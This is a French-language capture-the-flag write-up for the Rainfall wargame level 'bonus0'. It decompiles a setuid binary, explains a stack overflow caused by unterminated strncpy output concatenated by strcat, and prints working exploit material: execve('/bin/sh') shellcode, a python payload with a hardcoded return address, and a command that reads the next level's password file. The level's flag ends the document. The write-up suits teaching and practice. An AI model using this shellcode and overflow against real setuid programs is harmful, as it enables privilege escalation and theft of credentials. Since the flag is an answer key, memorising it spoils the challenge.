# rainfall : [bonus0]

Observations:
---

#### Source décompilée:
```c
char *p(char *dest, char *s)
{
  char buf[4104];

  puts(s);
  read(0, buf, 0x1000u);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 0x14u);
}

char *pp(char *dest)
{
  char src[20];
  char v3[28];

  p(src, " - ");
  p(v3, " - ");
  strcpy(dest, src);
  *(_WORD *)&dest[strlen(dest)] = ' ';
  return strcat(dest, v3);
}

int main(int argc, const char **argv, const char **envp)
{
  char s[42];

  pp(s);
  puts(s);
  return 0;
}
```

#### Détails du programme:
```bash
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>` | Appelle la fonction `<pp>` avec comme paramètre le tableau `s` de **42** octets puis affiche le contenu de ce dernier. |
| `<pp>` | Execute la fonction `<p>` deux fois, avec pour chaque appelle son paramètre réspectif; <br> Le tableau `src` de **20** octets ainsi que le tableau `v3` de **28** octets. <br> Ensuite elle copie le contenu de `src` dans le tableau `dest` passée en paramètre d'entrée. <br> Le caractère après la fin de ce tableau est changé en `' '`. <br> Et pour finir `dest` est concaténé avec `v3` et la fonction retourne `dest`. |
 | `<p>` | Affiche la chaîne de caractères `s` passée en paramètre puis lis **4096** octets de l'entrée standard pour les copier dans <br> le tableau `buf` de **4104** octets; Elle remplace ensuite le premier caractére `'\n'` atteignable par un `'\0'`. <br> Pour finir elle copie ensuite **20** octets du tableau `buf` vers `dest` qui est le tableau en paramètre de fonction et retourne ce dernier. |


#### Conclusions:
Même si les fonctions de lectures et de copies parraissent sécurisées aux premier abord, nous pouvons terminer les chaînes de \
caractères par autre chose que zéro. Les deux tableaux étant côte à côte dans la pile, l'appel à `<strcat>` copiera `dest` et `v3` avec `v3`.\
Copiant ainsi jusqu'à **61** caractères permettant ainsi d'écraser l'addresse de retour de la fonction `<main>` qui a une pile de **64** octets. \
Nous pouvons ainsi rediriger l'ordre d'exécution du programme.


----
Résolution:
----
Nous allons remplir le tableau de la première chaîne avec **20** caractères aléatoires. \
Ensuite nous injectons une fonction en shellcode suivis de caractères de bourrages pour compléter l'appel à `<read>` de **4096** octets. \
Nous finissons par remplir partiellement le buffer de read avec **14** octets aléatoire suivis de l'addresse du buffer de `<read>` préalablement récupéré grace a gdb. \
Puis nous rajoutons un octet de bourrage pour décaler correctement la position de l'addresse de retour du à l'ajout d'un espace au tableau `dest` dans la fonction `<pp>`.


#### Injection:
```asm
# La fonction injectée appelle system avec '/bin/sh' en paramètre:

0:  6a 0b                   	push   0xb
2:  58                      	pop    eax
3:  31 f6                   	xor    esi,esi
5:  56                      	push   esi
6:  68 2f 2f 73 68          	push   0x68732f2f
b:  68 2f 62 69 6e          	push   0x6e69622f
10: 89 e3                   	mov    ebx,esp
12: 31 c9                   	xor    ecx,ecx
14: 89 ca                   	mov    edx,ecx
16: cd 80                   	int    0x80
```
#### Commande:
```bash
(python -c "print('A'*20+ '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'B'*(4096 - 20 - 24 - 1) + '\n' + 'B'*14 + '\x94\xe6\xff\xbf' + 'C')"; echo 'cat /home/user/bonus1/.pass') | /home/user/bonus0/bonus0
```

**Flag :** cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
